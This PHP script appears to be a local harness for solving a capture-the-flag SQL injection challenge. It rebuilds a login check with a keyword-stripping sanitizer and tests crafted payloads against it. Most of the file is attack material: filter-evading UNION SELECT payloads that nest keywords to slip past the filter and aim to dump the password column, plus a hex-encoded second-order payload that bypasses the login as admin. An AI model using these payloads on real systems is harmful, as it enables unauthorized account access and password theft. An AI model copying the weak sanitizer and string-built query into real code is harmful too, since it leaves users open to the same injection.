<?php
# seems like ther are 204 users

# $in_mail = "\'/**/OorR/**/1=1/**/LIorMIT/**/1#";
# $in_mail = "\'/**/UNorION/**/SEorLECT/**/password/**/FRorOM/**/USorERS/**/WHorERE/**/id=1#";
# $in_mail = "\'/**/UNorION/**/SEorLECT/**/passwoorrd,passwoorrd,passwoorrd/**/FRorOM/**/users/**/WHorERE/**/id=1#";
# $in_mail = "\'/**/UNorION/**/SEorLECT/**/0,0,0#";
$in_mail = "\'/**/UNorION/**/SEorLECT/**/0,0x27204f52206d61696c203d202761646d696e40726f6f74272327,0#";
# ' OR mail = 'admin@root'#

$in_password = "foobar";
/* $password = "unguessable"; */

function graceful_death($message) {
    echo $message."\n";
    exit(1);
}

function sanitize($str) {
	if(preg_match('/["\s;\-\|&\(\)]/i', $str) !== 0) {
		graceful_death("Malicious characters detected");
	}
        $out = preg_replace('/union|select|where|and|or|concat|from/i', '', $str);
	$out = preg_replace("/'/", "\\'", $out);
	return $out;
}

function sql_execute($conn, $sql) {
    try {
        $sth = $conn->query($sql);
    } catch(PDOException $e) {
        echo $e->getTraceAsString()."\n\n";
        graceful_death($e->getMessage());
    }
	$result = $sth->fetchAll();
	return $result;
}

try {
	$dbh = new PDO("mysql:host=".$argv[1].";dbname=".$argv[2],
	               $argv[3], $argv[4]);
	$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$dbh->setAttribute(PDO::ATTR_EMULATE_PREPARES, 0);
} catch(PDOException $e) {
    echo "could not connect to database: " . $e->getMessage();
}

$mail = sanitize($in_mail);
echo "\n".$mail."\n\n";

$password = sanitize($in_password);
/* $sql = "SELECT * FROM users WHERE mail = '$in_mail'"; */
$sql = "SELECT * FROM users WHERE mail = '$mail'";
echo $sql."\n\n";

$usrs = sql_execute($dbh, $sql);
echo var_dump($usrs);

if(count($usrs) < 1) {
    graceful_death("Mail not found");
} elseif(count($usrs) > 1) {
    graceful_death("Multiple users returned");
} else {
    $sql = "SELECT mail FROM users WHERE mail = '" . $usrs[0]['mail'] . "' AND password = :password";
    echo "\n".$sql."\n\n";
    $sth = $dbh->prepare($sql);
    if(!$sth) graceful_death("empty");
    $sth->bindValue(':password', $password);
    echo "\n".var_dump($sth)."\n\n";
    $result = $sth->execute();
    if(false === $result) graceful_death();
    $result = $sth->fetchAll();
    echo "\n".var_dump($result)."\n";
    if(count($result) === 1) {
        graceful_death("Logged in");
    } else {
        graceful_death("Wrong password");
    }
}
?>
